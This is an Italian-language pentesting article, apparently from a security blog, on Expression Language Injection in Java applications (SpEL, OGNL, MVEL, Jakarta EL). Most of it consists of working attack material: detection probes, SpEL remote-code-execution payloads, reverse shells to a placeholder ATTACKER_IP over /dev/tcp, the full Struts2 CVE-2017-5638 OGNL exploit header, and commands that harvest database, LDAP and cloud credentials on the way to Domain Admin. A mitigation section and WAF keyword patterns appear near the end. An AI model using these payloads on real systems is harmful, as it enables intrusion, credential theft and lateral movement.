---
title: 'Expression Language Injection (EL): SpEL, OGNL ,MVEL e RCE Java'
slug: expression-language-injection
description: >-
  Scopri cos’è la Expression Language Injection e come sfruttarla nelle app
  Java: SpEL, OGNL, Spring, Struts2, RCE e casi reali come Equifax.
image: /expression-language-injection.webp
draft: false
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - el
---

Se la [SSTI](https://hackita.it/articoli/ssti) colpisce i template engine Python/PHP/Node, la **Expression Language Injection** è il suo equivalente nel mondo Java — e ha un track record di devastazione che include il **data breach di Equifax del 2017**: 143 milioni di americani, causato da una OGNL Injection in Apache Struts2. Una delle più grandi violazioni di dati nella storia.

L'**EL Injection nel pentesting Java** è una delle vulnerabilità più redditizie su applicazioni enterprise: porta a RCE pre-auth, spesso in meno di 15 minuti, su sistemi con accesso diretto a database, LDAP e Active Directory. La trovo nel **6% dei pentest su applicazioni Java enterprise** — specialmente Spring Boot con SpEL esposto, e sistemi legacy Struts2 non patchati.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [SSTI](https://hackita.it/articoli/ssti), [Command Injection](https://hackita.it/articoli/command-injection).

***

## In Sintesi

|                      |                                                                                            |
| -------------------- | ------------------------------------------------------------------------------------------ |
| **Cos'è**            | Input utente valutato come espressione Java (SpEL/OGNL/MVEL) → accesso completo al runtime |
| **Impatto**          | RCE diretta, spesso pre-auth. CVSS 9.8–10.0. Ha causato il breach Equifax                  |
| **Come verificarlo** | `${7*7}` → se restituisce 49, sei dentro                                                   |
| **Come sfruttarlo**  | `${T(java.lang.Runtime).getRuntime().exec('id')}` → shell in minuti                        |
| **Come mitigarlo**   | Mai valutare input utente come EL. Aggiorna Struts2. Usa `SimpleEvaluationContext`         |
| **Frequenza**        | 6% dei pentest su app Java enterprise                                                      |

***

## Cos'è la Expression Language Injection

L'Expression Language (EL) è un mini-linguaggio integrato nei framework Java — Spring, Struts, JSF, JSP — che permette di accedere a oggetti Java dalle view e dai template. `${user.name}` mostra il nome utente. Semplice, utile, intenzionale.

Il problema: EL è molto più potente di un semplice accessor. Può istanziare classi arbitrarie, chiamare metodi statici, accedere a `Runtime.getRuntime().exec()`. Se l'input dell'utente viene valutato come espressione EL invece di essere trattato come stringa, il risultato è **Remote Code Execution** — con i privilegi dell'application server.

Non è una vulnerabilità che richiede condizioni particolari o exploit elaborati. Un campo di testo, un header HTTP, un parametro GET — se finisce in un contesto SpEL o OGNL senza sanitizzazione, il gioco è fatto.

***

## I Linguaggi di Espressione Java

Ogni framework Java ha il suo EL. Stessa logica, sintassi diversa — cambia il payload, non il concetto.

| Linguaggio     | Framework               | Sintassi             | Note                                               |
| -------------- | ----------------------- | -------------------- | -------------------------------------------------- |
| **SpEL**       | Spring Boot, Spring MVC | `${expr}`, `#{expr}` | Il più diffuso nel 2026                            |
| **OGNL**       | Apache Struts2          | `%{expr}`            | Causa del breach Equifax — ogni CVE è RCE pre-auth |
| **MVEL**       | Rules engine vari       | `${expr}`            | Meno comune, presente in middleware enterprise     |
| **Jakarta EL** | JSF, JSP                | `${expr}`, `#{expr}` | Standard Java EE, presente ovunque                 |

**Regola operativa:** identifica il framework prima di scegliere il payload. Un `%{7*7}` su Spring non fa niente. Un `${7*7}` su Struts2 potrebbe farti sparire dagli occhi dei WAF.

***

## Detection — Come Identificare EL Injection

### Step 1: Identifica il Framework

```bash
# Header HTTP rivelano spesso il framework:
curl -sI https://target.com | grep -iE "x-powered-by|server|x-aspnet"

# Esempi:
# X-Powered-By: Spring Boot         → SpEL
# Server: Apache Tomcat              → probabilmente Struts2 o Spring
# X-CF-Powered-By: Struts2          → OGNL

# Errori 500 con stack trace Java sono oro:
# "ognl.OgnlException"               → OGNL/Struts2
# "org.springframework.expression"   → SpEL
# "javax.el.ELException"             → Jakarta EL
```

### Step 2: Payload di Detection

Testa questi su ogni parametro, header, e campo di input:

```
# Aritmetica base — se restituisce il risultato, EL è attivo
${7*7}         → 49? → SpEL o Jakarta EL attivo
#{7*7}         → 49? → SpEL deferred evaluation
%{7*7}         → 49? → OGNL (Struts2)
*{7*7}         → 49? → SpEL in Spring binding expression

# Se l'app restituisce "49" invece di "${7*7}" → VULNERABILE

# Test accesso classi (SpEL) — più invasivo, ma conferma RCE possibile
${T(java.lang.Math).PI}               → 3.14159...?
${T(java.lang.System).getenv('PATH')} → path di sistema?
```

### Step 3: Dove Cercarli

```bash
# Parametri GET/POST ovvi:
?name=${7*7}
?search=${7*7}
?template=${7*7}
?message=#{7*7}

# Header HTTP — specialmente su Struts2:
Content-Type: %{7*7}
Accept-Language: ${7*7}
X-Forwarded-For: ${7*7}

# Body JSON:
{"name": "${7*7}", "template": "#{7*7}"}

# Form fields — specialmente campi "note", "descrizione", "messaggio"
# che vengono renderizzati da qualche parte nell'applicazione

# Cookie values:
Cookie: username=${7*7}; session=abc123
```

### Step 4: Distinguere EL da Template Injection Generica

```bash
# SSTI Python/PHP usa sintassi simile ma non è EL:
{{7*7}}   → Jinja2/Twig (Python/PHP)
${7*7}    → SpEL/EL Java (o Freemarker)
%{7*7}    → OGNL Struts2

# Se vedi stack trace Java nell'errore → EL
# Se vedi "TemplateException" o "org.thymeleaf" → template engine diverso
# Se vedi "ognl.OgnlException" → jackpot Struts2
```

***

## SpEL Injection (Spring Boot)

SpEL è il linguaggio di espressioni nativo di Spring. Usato per `@Value`, `@PreAuthorize`, `@Query` JPA, e template Thymeleaf. Quando un valore utente finisce in un contesto SpEL non protetto, il risultato è RCE con i privilegi del processo Spring Boot.

### Detection SpEL

```java
// Payload base
${7*7}           → 49 → SpEL attivo
#{7*7}           → 49 → SpEL deferred
*{7*7}           → 49 → binding expression

// Accesso a classi Java — conferma che T() è disponibile
${T(java.lang.Math).PI}
${T(java.lang.System).getProperty('java.version')}
${T(java.lang.System).getProperty('user.name')}
```

### RCE SpEL — Dal Test alla Shell

```java
// Step 1: Conferma esecuzione comandi
${T(java.lang.Runtime).getRuntime().exec('id')}
// → Restituisce un oggetto Process, non l'output direttamente

// Step 2: Leggi l'output (questo funziona)
${new java.util.Scanner(
  T(java.lang.Runtime).getRuntime().exec('id').getInputStream()
).useDelimiter('\\A').next()}
// → "uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)"

// Step 3: Comandi arbitrari
${new java.util.Scanner(
  T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()
).useDelimiter('\\A').next()}

${new java.util.Scanner(
  T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()
).useDelimiter('\\A').next()}

// Step 4: Reverse shell
${T(java.lang.Runtime).getRuntime().exec(
  new String[]{'/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'}
)}

// Alternativa con ProcessBuilder (più stabile):
${new java.lang.ProcessBuilder(
  new String[]{'/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'}
).start()}
```

### SpEL in Spring Security — `@PreAuthorize`

```java
// Vulnerabilità specifica: Spring Security usa SpEL per le annotations
// Se il valore del parametro finisce nell'expression di autorizzazione:

@PreAuthorize("hasPermission(#username, 'read')")
public void getData(@PathVariable String username) { ... }

// Payload: username = "' or T(java.lang.Runtime).getRuntime().exec('id') == '"
// → SpEL valutato nel contesto di sicurezza → RCE pre-autorizzazione
```

***

## OGNL Injection (Apache Struts2) — Il Breach di Equifax

OGNL è il linguaggio di espressioni di Struts2. Ogni release di Struts2 degli ultimi 10 anni ha avuto almeno una CVE OGNL critica — tutte CVSS 9.8-10.0, tutte RCE pre-auth. Il breach Equifax è la conseguenza più visibile, ma i sistemi Struts2 non patchati esistono ancora oggi, specialmente in ambienti enterprise legacy.

### CVE-2017-5638 — Il Payload Equifax

Apache Struts2 valutava espressioni OGNL negli header `Content-Type` e nei messaggi di errore. Un header malevolo → RCE pre-auth, senza autenticazione, su qualsiasi endpoint Struts2 esposto:

```bash
# Detection (deve restituire qualcosa di diverso da "multipart/form-data"):
curl -X POST https://target.com/action \
  -H 'Content-Type: %{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd","/c",#cmd}:{"/bin/sh","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'

# Output: uid=1001(tomcat) → RCE confermata
```

### Altre CVE Struts2 Critiche — Tutte RCE

| CVE            | Anno | Vettore                            | CVSS |
| -------------- | ---- | ---------------------------------- | ---- |
| CVE-2017-5638  | 2017 | Content-Type header                | 10.0 |
| CVE-2017-9805  | 2017 | Deserializzazione XML → OGNL       | 9.8  |
| CVE-2018-11776 | 2018 | OGNL nel namespace URL             | 10.0 |
| CVE-2020-17530 | 2020 | Double OGNL evaluation             | 9.8  |
| CVE-2023-50164 | 2023 | Path traversal → file upload → RCE | 9.8  |

**Regola:** se vedi Struts2 → controlla la versione → confronta con le CVE sopra. Se non è patchata, hai quasi certamente RCE pre-auth.

```bash
# Identifica versione Struts2 dagli errori o dai path:
curl -sI https://target.com/action.do
curl -sI https://target.com/index.action
# Header "X-Powered-By: Struts2" o "Struts2-x.x.x" nelle risposte di errore
```

***

## MVEL e Jakarta EL

### MVEL

Meno comune, ma presente in middleware enterprise come regole engine e workflow engine (Drools, jBPM, alcune implementazioni JBoss).

```java
// Detection
${7*7}       → 49?
// Accesso sistema
${System.getProperty("user.name")}
// RCE
${Runtime.getRuntime().exec("id")}
```

### Jakarta EL (JSF, JSP)

Standard Java EE, presente in qualsiasi applicazione JSF e JSP. Più restrittivo di SpEL di default — non permette `T()` — ma in contesti di EL composition o con implementazioni custom, la superficie di attacco esiste.

```java
// Detection
${7*7}       → 49?
#{7*7}       → 49?

// Se EL 3.0+: lambda expressions
${(x -> x*x)(7)}  → 49?

// Accesso a managed beans JSF
${userBean.admin}   → true? → accesso all'oggetto Java
```

***

## Escalation Enterprise — Da Shell a Domain Admin

I server applicativi Java enterprise quasi sempre hanno accesso diretto a risorse critiche. La EL Injection non è solo RCE su un singolo server: è il punto di ingresso a tutto quello che quel server tocca.

```
EL Injection
    → RCE su application server (Tomcat / WildFly / WebSphere / JBoss)
    → context.xml / application.properties → DataSource con credenziali DB in chiaro
    → Spring config → credenziali LDAP
    → JNDI context → service credentials interne
    → Application server domain-joined → Kerberoasting
    → Lateral movement → Domain Admin
```

### Cosa Cercare Dalla Shell

```bash
# Credenziali database (Spring Boot)
cat /app/application.properties | grep -iE "datasource|password|username"
cat /app/application.yml | grep -iE "datasource|password|username"

# Credenziali database (Tomcat)
cat $CATALINA_HOME/conf/context.xml | grep -iE "password|username|url"

# Credenziali LDAP
grep -r "ldap" /app/ --include="*.properties" --include="*.yml" --include="*.xml"

# Chiavi AWS/cloud
env | grep -iE "aws|azure|gcp|secret|key|token"

# Kerberos — se domain-joined
klist 2>/dev/null
cat /etc/krb5.conf 2>/dev/null
```

***

## Workflow Operativo

**Step 1** → Identifica il framework dagli header HTTP e dai messaggi di errore (Spring Boot, Struts2, JSF, JSP)

**Step 2** → Testa `${7*7}`, `#{7*7}`, `%{7*7}`, `*{7*7}` su ogni parametro, header, e campo di input

**Step 3** → Se risposta aritmetica → conferma con accesso a proprietà sistema: `${T(java.lang.System).getProperty('user.name')}`

**Step 4** → RCE: `${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}`

**Step 5** → Reverse shell → raccogli credenziali da config files (DataSource, LDAP, cloud keys)

**Step 6** → Verifica se il server è domain-joined → Kerberoasting / lateral movement

**Step 7** → Documenta: framework, CVE se Struts2, impatto (RCE + dati raggiungibili)

***

## Output Reale

```bash
# Test detection su parametro ?name=
$ curl "https://target.com/profile?name=%24%7B7*7%7D"
# Response: "Ciao, 49!"
# → SpEL attivo, input non sanitizzato

# Escalation a lettura file
$ curl "https://target.com/profile?name=%24%7Bnew+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat+/etc/passwd').getInputStream()).useDelimiter('\\A').next()%7D"
# Response: "Ciao, root:x:0:0:root:/root:/bin/bash\ntomcat:x:1001:..."
# → RCE confermata, output leggibile

# Credenziali database da application.properties
$ curl "https://target.com/profile?name=..." # [payload cat application.properties]
# spring.datasource.username=produser
# spring.datasource.password=Pr0dP@ssw0rd!
# spring.datasource.url=jdbc:oracle:thin:@dbserver:1521:PROD
```

***

## Caso Studio

**Settore:** Assicurazione, Spring Boot, portale agenti. Scope grey-box.

Il portale aveva un campo "note agente" renderizzato con SpEL per variabili template (`#{agent.name}`). Ho inserito `${7*7}` → 49 nel rendering. `${T(java.lang.Runtime).getRuntime().exec('id')}` → conferma RCE.

Dalla shell Tomcat → `application.properties` con credenziali Oracle del database sinistri (10 milioni di pratiche assicurative) → Spring config con credenziali LDAP → Tomcat come service account domain-joined → Kerberoasting → Domain Admin in 3 ore.

**Tempo dalla prima `${7*7}` alla shell:** 8 minuti.
**Tempo dalla shell a Domain Admin:** 3 ore.
**Dati raggiungibili:** 10M pratiche assicurative, LDAP dell'intera organizzazione.

***

## Mitigazione

La EL Injection si previene a livello di design, non di WAF. Un WAF può ritardare l'attacco — non fermarlo.

**Mai valutare input utente come SpEL/OGNL/EL** — è la regola principale. Se devi usare SpEL su dati utente, usa `SimpleEvaluationContext` invece di `StandardEvaluationContext`: disabilita l'accesso a classi, metodi statici, e reflection.

**Aggiorna Struts2** — ogni CVE OGNL è RCE pre-auth. Se hai Struts2 \< 2.5.33 in produzione oggi, hai quasi certamente una vulnerabilità sfruttabile. Vedi la tabella CVE sopra.

**Spring Security** — disabilita SpEL evaluation su parametri controllabili dall'utente nelle annotation `@PreAuthorize` e `@PostAuthorize`.

**WAF** — regole per i pattern più comuni: `T(java.lang`, `Runtime`, `ProcessBuilder`, `getRuntime`, `exec(`, `ProcessBuilder` nei parametri e negli header. Non è una soluzione completa, ma riduce il rumore di exploit automatici.

**Sandboxing** — se SpEL è architetturalmente necessario su input utente, `SimpleEvaluationContext` limita drasticamente la superficie: nessun accesso a `T()`, nessun metodo statico, nessuna reflection.

***

## FAQ

### La EL Injection è diversa dalla SSTI?

Concettualmente simile — entrambe iniettano codice in un sistema di template/espressioni. La differenza è il runtime: SSTI colpisce Jinja2, Twig, Freemarker (Python/PHP/Java template engine). EL Injection colpisce SpEL/OGNL/MVEL che hanno accesso diretto al runtime Java — classi, reflection, exec. In pratica, la EL Injection su SpEL/OGNL ha un path a RCE più diretto e più affidabile.

### Perché Struts2 ha così tante CVE OGNL?

Il design di Struts2 usa OGNL pervasivamente — per URL routing, per messaggi di errore, per binding dei parametri. Questo significa che qualsiasi punto in cui una stringa controllabile dall'utente entra nel sistema può diventare un vettore OGNL. La superficie è enorme e ogni nuova funzionalità rischia di introdurre un nuovo vettore. Le patch risolvono un caso specifico — spesso ne lasciano aperti altri.

### `SimpleEvaluationContext` protegge davvero?

Sì, se configurato correttamente. Disabilita `T()`, i metodi statici, la reflection, e l'accesso a classi arbitrarie. Limita SpEL a property access e operatori di base. Il rischio rimane se la configurazione è ibrida — alcune parti del codice usano `SimpleEvaluationContext`, altre usano `StandardEvaluationContext` sullo stesso dato.

### Quanto è realistica la parte di escalation a Domain Admin?

Molto. I server applicativi Java enterprise sono quasi sempre configurati con un service account domain-joined per accedere a database e LDAP. Le credenziali sono in chiaro nei config file perché Spring/Tomcat le richiedono in chiaro per connettersi alle risorse. È una delle escalation più lineari in un ambiente enterprise Windows — RCE su Tomcat → credenziali in config → LDAP → Kerberoasting → DA.

***

## ✅ Checklist

```
DETECTION
☐ Framework identificato (Spring Boot / Struts2 / JSF / JSP)
☐ Versione Struts2? → confronta con tabella CVE
☐ ${7*7}, #{7*7}, %{7*7}, *{7*7} testati su OGNI parametro input
☐ Header HTTP testati (Content-Type, Accept-Language, X-Forwarded-For)
☐ Cookie values testati
☐ Stack trace Java rilevati? → framework/versione confermata

EXPLOITATION
☐ T(java.lang.Runtime).getRuntime().exec() funziona?
☐ Output leggibile con Scanner?
☐ Reverse shell attiva?
☐ application.properties / context.xml letti?
☐ Credenziali database estratte?
☐ Credenziali LDAP estratte?
☐ Server domain-joined? → Kerberoasting possibile?

IMPATTO
☐ CVE specifica identificata (Struts2)?
☐ Dati raggiungibili documentati (DB, LDAP, cloud)
☐ Privilegio del processo (tomcat user, root, service account)
☐ Lateral movement possibile?
```

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [SSTI](https://hackita.it/articoli/ssti), [Command Injection](https://hackita.it/articoli/command-injection).
